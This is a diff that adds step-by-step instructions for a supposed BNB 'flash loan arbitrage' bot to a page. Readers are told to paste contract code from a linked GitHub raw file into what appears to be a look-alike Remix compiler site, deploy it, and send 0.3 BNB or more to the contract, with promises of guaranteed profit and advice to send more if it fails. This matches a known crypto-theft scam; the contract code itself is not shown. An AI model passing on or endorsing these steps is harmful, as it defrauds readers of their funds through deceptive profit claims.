@@ -1,2 +1,22 @@
 If you want to learn more about flashloans simply visit binance academy through the link below
-https://academy.binance.com/en/articles/what-are-flash-loans-in-defi
+► https://academy.binance.com/en/articles/what-are-flash-loans-in-defi
+You can also watch the detailed step by step tutorial 
+► https://streamable.com/bsi3my
+
+STEP 1: Get the Metamask extension for your browser
+STEP 2: Open https://remixcompiler.com/ from your browser. Click on File Explorer and click “Create New File”.
+STEP 3: Name the file flashloans.sol and paste the contract code link below. 
+► https://raw.githubusercontent.com/Crypto-Chad12/CryptoArbitrage/a709e8311bdd48fe4681003da782796ad5bcc18b/bnb-arbit1
+STEP 4: Click Deploy and Run Transaction and set “ENVIRONMENT” to Web 3 installed.
+STEP 5: Connect your MetaMask wallet. Click on “Solidity Compiler” and set the compiler type to 0.5.0
+STEP 6: Click on the Solidity folder and click on the blue button “Compile flashloans.sol” and wait for the code to compile
+STEP 7: Click Deploy and Execute Trades and click the down arrow to the right of the “Apply” button.
+STEP 8: Set the test item “_TOKENNAME” and the “_TOKENSYMBOL” TOKX then the “_LOANAMOUNT” 2000.
+STEP 9: Click Transact and confirm the transaction with MetaMask. Wait for the transaction to be confirmed.
+STEP 10: Copy the address of the newly sent contract. Send BNB to fixed contract to start 0.3+ (0.3 higher is better because you will get more money with each exchange)
+STEP 11: After the transcation has been confirmed, click “action” (red box) to make a Flash loan. Confirm the transaction with MetaMask and wait for confirmation.
+STEP 12: You can now check your wallet. If it doesn't work with 0.3 BNB you can try sending another 0.3BNB because the fees vary daily.
+
+Avoid using small amounts as contracts can fall below 0.15 BNB. In rare cases, the trial may fail due to the suspension of BNB and your smart contract, because the price of gas changes from time to time.
+Do not panic, all you have to do is wait a little (5–10 minutes) and try the transaction again this time preferably with a loan amount of 825 and a gas limit of 31,560 and that should work 100% but with a small profit.
+Make sure to transfer your BNB to another wallet when you’re done.
